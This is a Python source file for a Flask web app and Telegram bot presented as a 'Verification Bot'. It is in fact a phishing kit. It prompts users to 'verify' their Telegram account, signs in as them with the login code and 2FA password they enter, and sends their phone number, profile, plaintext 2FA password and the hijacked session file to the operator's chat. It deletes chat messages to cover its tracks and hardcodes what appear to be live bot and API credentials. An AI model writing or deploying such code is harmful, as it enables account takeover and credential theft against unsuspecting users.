import os
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from flask import Flask, render_template, request, jsonify
import asyncio
from datetime import datetime, timedelta
import re
import time
import threading
import requests
import uuid
import json

# Initialize Flask
app = Flask(__name__)

# Configuration
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA')
USER_ID = int(os.environ.get('USER_ID', '5425526761'))
API_ID = int(os.environ.get('API_ID', '25240346'))
API_HASH = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
WEBHOOK_URL = os.environ.get('WEBHOOK_URL', '')

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Storage
sessions = {}
active_webapps = {}  # Track active WebApp sessions
session_expiry = 300

# Create directories
os.makedirs('sessions', exist_ok=True)

# ==================== HELPER FUNCTIONS ====================
def generate_session_id():
    return str(uuid.uuid4())

def clean_phone(phone):
    return re.sub(r'[^\d+]', '', phone)

def generate_session_file(phone):
    safe_phone = clean_phone(phone)
    timestamp = int(time.time())
    return f"sessions/{safe_phone}_{timestamp}.session"

def clean_otp(otp):
    cleaned = re.sub(r'\D', '', otp)
    return cleaned if len(cleaned) == 5 else None

# ==================== TELEGRAM CLIENT FUNCTIONS ====================
telegram_clients = {}

def get_client(session_file):
    if session_file not in telegram_clients:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        client = TelegramClient(
            session_file,
            API_ID,
            API_HASH,
            loop=loop,
            timeout=15
        )
        telegram_clients[session_file] = {
            'client': client,
            'loop': loop
        }
    return telegram_clients[session_file]

async def send_otp_async(client, phone):
    try:
        await client.connect()
        result = await client.send_code_request(phone)
        return {
            'success': True,
            'phone_code_hash': result.phone_code_hash
        }
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def verify_otp_async(client, phone, code, phone_code_hash):
    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        
        if await client.is_user_authorized():
            me = await client.get_me()
            return {
                'success': True,
                'requires_2fa': False,
                'user': me
            }
        else:
            return {'success': True, 'requires_2fa': True}
            
    except SessionPasswordNeededError:
        return {'success': True, 'requires_2fa': True}
    except PhoneCodeExpiredError:
        return {'success': False, 'error': 'OTP expired', 'code_expired': True}
    except PhoneCodeInvalidError:
        return {'success': False, 'error': 'Invalid OTP'}
    except Exception as e:
        error_str = str(e).lower()
        if 'password' in error_str or '2fa' in error_str:
            return {'success': True, 'requires_2fa': True}
        return {'success': False, 'error': str(e)}

async def verify_2fa_async(client, password):
    try:
        await client.sign_in(password=password)
        me = await client.get_me()
        return {
            'success': True,
            'user': me
        }
    except Exception as e:
        return {'success': False, 'error': str(e)}

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/init-webapp', methods=['POST'])
def init_webapp():
    """Initialize WebApp session"""
    data = request.json
    user_id = data.get('user_id', '')
    webapp_id = generate_session_id()
    
    active_webapps[webapp_id] = {
        'user_id': user_id,
        'created': datetime.now(),
        'status': 'initialized'
    }
    
    return jsonify({
        'success': True,
        'webapp_id': webapp_id
    })

@app.route('/api/process-contact', methods=['POST'])
def process_contact():
    try:
        data = request.json
        phone = data.get('phone', '').strip()
        webapp_id = data.get('webapp_id', '')
        
        if not phone:
            return jsonify({'success': False, 'error': 'No phone number'})
        
        if not phone.startswith('+'):
            phone = '+' + phone
        
        # Validate phone
        if len(phone) < 8:
            return jsonify({'success': False, 'error': 'Invalid phone number'})
        
        session_id = generate_session_id()
        session_file = generate_session_file(phone)
        
        # Get Telegram client and send OTP
        client_data = get_client(session_file)
        client = client_data['client']
        loop = client_data['loop']
        
        result = loop.run_until_complete(send_otp_async(client, phone))
        
        if result['success']:
            sessions[session_id] = {
                'phone': phone,
                'phone_code_hash': result['phone_code_hash'],
                'session_file': session_file,
                'webapp_id': webapp_id,
                'expiry': datetime.now() + timedelta(seconds=session_expiry),
                'attempts': 0,
                'created': datetime.now()
            }
            
            # Update WebApp session
            if webapp_id in active_webapps:
                active_webapps[webapp_id]['phone'] = phone
                active_webapps[webapp_id]['status'] = 'otp_sent'
            
            # Notify admin
            try:
                bot.send_message(
                    USER_ID,
                    f"📲 <b>WebApp Contact Received</b>\n\n📱 {phone}\n🆔 {webapp_id}\n⏰ {datetime.now().strftime('%H:%M:%S')}",
                    parse_mode='HTML'
                )
            except Exception as e:
                print(f"Admin notify error: {e}")
            
            return jsonify({
                'success': True,
                'session_id': session_id,
                'message': 'OTP sent successfully'
            })
        else:
            error_msg = result.get('error', 'Failed to send OTP')
            # User-friendly error messages
            if 'PHONE_NUMBER_INVALID' in error_msg:
                error_msg = 'Invalid phone number format'
            elif 'FLOOD_WAIT' in error_msg:
                error_msg = 'Please wait before trying again'
            
            return jsonify({'success': False, 'error': error_msg})
            
    except Exception as e:
        print(f"Process contact error: {e}")
        return jsonify({'success': False, 'error': 'Server error'})

@app.route('/api/verify-otp', methods=['POST'])
def verify_otp():
    try:
        data = request.json
        session_id = data.get('session_id')
        otp = data.get('otp', '')
        
        if session_id not in sessions:
            return jsonify({'success': False, 'error': 'Session expired. Please restart'})
        
        session = sessions[session_id]
        
        # Clean OTP
        cleaned_otp = clean_otp(otp)
        if not cleaned_otp:
            return jsonify({'success': False, 'error': 'Enter 5-digit OTP'})
        
        # Check attempts
        session['attempts'] += 1
        if session['attempts'] > 3:
            del sessions[session_id]
            return jsonify({'success': False, 'error': 'Too many attempts. Please restart'})
        
        # Verify OTP
        client_data = get_client(session['session_file'])
        client = client_data['client']
        loop = client_data['loop']
        
        result = loop.run_until_complete(verify_otp_async(
            client,
            session['phone'],
            cleaned_otp,
            session['phone_code_hash']
        ))
        
        if result['success']:
            if result.get('requires_2fa'):
                session['expiry'] = datetime.now() + timedelta(seconds=600)
                session['status'] = 'needs_2fa'
                
                # Update WebApp session
                webapp_id = session.get('webapp_id')
                if webapp_id in active_webapps:
                    active_webapps[webapp_id]['status'] = 'needs_2fa'
                
                return jsonify({
                    'success': True,
                    'requires_2fa': True,
                    'message': '2FA password required'
                })
            else:
                # Success - send to admin
                user_info = result.get('user')
                send_verification_success(session, user_info)
                
                # Clean up
                if session.get('webapp_id') in active_webapps:
                    active_webapps[session['webapp_id']]['status'] = 'completed'
                
                del sessions[session_id]
                return jsonify({
                    'success': True,
                    'requires_2fa': False,
                    'message': 'Verification successful'
                })
        else:
            if result.get('code_expired'):
                del sessions[session_id]
                return jsonify({'success': False, 'error': 'OTP expired. Please restart'})
            return jsonify({'success': False, 'error': result.get('error', 'Invalid OTP')})
            
    except Exception as e:
        print(f"Verify OTP error: {e}")
        return jsonify({'success': False, 'error': 'Verification error'})

@app.route('/api/verify-2fa', methods=['POST'])
def verify_2fa():
    try:
        data = request.json
        session_id = data.get('session_id')
        password = data.get('password', '').strip()
        
        if session_id not in sessions:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        if not password:
            return jsonify({'success': False, 'error': 'Enter 2FA password'})
        
        session = sessions[session_id]
        client_data = get_client(session['session_file'])
        client = client_data['client']
        loop = client_data['loop']
        
        result = loop.run_until_complete(verify_2fa_async(client, password))
        
        if result['success']:
            # Success with 2FA
            user_info = result.get('user')
            send_verification_success(session, user_info, password)
            
            # Clean up
            if session.get('webapp_id') in active_webapps:
                active_webapps[session['webapp_id']]['status'] = 'completed'
            
            del sessions[session_id]
            return jsonify({'success': True, 'message': '2FA verification successful'})
        else:
            return jsonify({'success': False, 'error': 'Wrong 2FA password'})
            
    except Exception as e:
        print(f"2FA error: {e}")
        return jsonify({'success': False, 'error': '2FA verification failed'})

def send_verification_success(session, user_info=None, password=None):
    """Send verification success to admin"""
    try:
        phone = session['phone']
        msg = f"✅ <b>VERIFICATION SUCCESSFUL</b>\n\n📱 Phone: {phone}\n"
        
        if user_info:
            msg += f"👤 User: {user_info.first_name or ''} {user_info.last_name or ''}\n"
            msg += f"🔗 Username: @{user_info.username or 'N/A'}\n"
            msg += f"🆔 ID: {user_info.id}\n"
        
        if password:
            msg += f"🔐 2FA Password: {password}\n"
        
        msg += f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        msg += f"🌐 Source: WebApp"
        
        bot.send_message(USER_ID, msg, parse_mode='HTML')
        
        # Send session file
        session_file = session.get('session_file')
        if session_file and os.path.exists(session_file):
            try:
                with open(session_file, 'rb') as f:
                    bot.send_document(
                        USER_ID,
                        f,
                        caption=f"Session file for {phone}"
                    )
            except Exception as e:
                print(f"Session file send error: {e}")
                
    except Exception as e:
        print(f"Send success error: {e}")

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    """Send WebApp launch button"""
    try:
        # Get base URL
        if WEBHOOK_URL:
            base_url = WEBHOOK_URL.rstrip('/')
        else:
            base_url = f"https://{request.host}" if request else "http://localhost:5000"
        
        # Create WebApp button
        keyboard = types.InlineKeyboardMarkup()
        webapp_button = types.InlineKeyboardButton(
            text="🔐 Open Verification",
            web_app=types.WebAppInfo(url=f"{base_url}/")
        )
        keyboard.add(webapp_button)
        
        # Send message with button
        bot.send_message(
            message.chat.id,
            "Click the button below to verify your Telegram account:",
            reply_markup=keyboard,
            disable_notification=True  # No notification sound
        )
        
        # Delete this message after 5 seconds
        threading.Thread(
            target=delete_message_after_delay,
            args=(message.chat.id, message.message_id + 1),
            daemon=True
        ).start()
        
    except Exception as e:
        print(f"Start command error: {e}")

def delete_message_after_delay(chat_id, message_id, delay=5):
    """Delete message after delay"""
    time.sleep(delay)
    try:
        bot.delete_message(chat_id, message_id)
    except:
        pass

@bot.message_handler(content_types=['contact'])
def handle_contact_message(message):
    """Auto-delete any contact messages"""
    try:
        bot.delete_message(message.chat.id, message.message_id)
        
        # Send WebApp button instead
        send_welcome(message)
        
    except Exception as e:
        print(f"Contact delete error: {e}")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """Handle all other messages - just delete them"""
    try:
        if message.text and not message.text.startswith('/'):
            bot.delete_message(message.chat.id, message.message_id)
    except:
        pass

# ==================== CLEANUP ====================
def cleanup_old_sessions():
    """Clean up old sessions periodically"""
    while True:
        time.sleep(60)
        current_time = datetime.now()
        
        # Clean user sessions
        expired_sessions = []
        for session_id, session in sessions.items():
            if session['expiry'] < current_time:
                expired_sessions.append(session_id)
        
        for session_id in expired_sessions:
            del sessions[session_id]
        
        # Clean WebApp sessions
        expired_webapps = []
        for webapp_id, webapp in active_webapps.items():
            if (current_time - webapp.get('created', current_time)).seconds > 3600:  # 1 hour
                expired_webapps.append(webapp_id)
        
        for webapp_id in expired_webapps:
            del active_webapps[webapp_id]
        
        if expired_sessions or expired_webapps:
            print(f"Cleaned {len(expired_sessions)} sessions and {len(expired_webapps)} webapps")

# ==================== MAIN ====================
if __name__ == '__main__':
    print("="*60)
    print("🤖 Telegram WebApp Verification Bot")
    print("="*60)
    
    # Start cleanup thread
    threading.Thread(target=cleanup_old_sessions, daemon=True).start()
    
    # Get port from environment
    port = int(os.environ.get('PORT', 5000))
    
    # Check if running on Render
    is_render = 'RENDER' in os.environ
    
    if is_render and WEBHOOK_URL:
        # Setup webhook for Render
        print("🌐 Setting up webhook for Render...")
        try:
            bot.remove_webhook()
            time.sleep(1)
            webhook_url = f"{WEBHOOK_URL.rstrip('/')}/webhook"
            bot.set_webhook(url=webhook_url)
            print(f"✅ Webhook set: {webhook_url}")
        except Exception as e:
            print(f"❌ Webhook error: {e}")
            print("⚠️ Falling back to polling")
            is_render = False
    
    if is_render:
        # Webhook mode
        @app.route('/webhook', methods=['POST'])
        def webhook():
            if request.headers.get('content-type') == 'application/json':
                json_string = request.get_data().decode('utf-8')
                update = types.Update.de_json(json_string)
                bot.process_new_updates([update])
                return ''
            return 'Bad Request', 400
        
        print(f"🚀 Starting in webhook mode on port {port}")
        print(f"📱 WebApp URL: {WEBHOOK_URL}")
        app.run(host='0.0.0.0', port=port, debug=False)
        
    else:
        # Polling mode (for local development)
        print("🔧 Starting in polling mode (local development)")
        print(f"📱 WebApp URL: http://localhost:{port}")
        
        # Start bot in separate thread
        def run_bot_polling():
            print("🤖 Starting bot polling...")
            try:
                bot.polling(none_stop=True, timeout=20)
            except Exception as e:
                print(f"Bot polling error: {e}")
                time.sleep(5)
                run_bot_polling()
        
        bot_thread = threading.Thread(target=run_bot_polling, daemon=True)
        bot_thread.start()
        
        # Run Flask app
        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
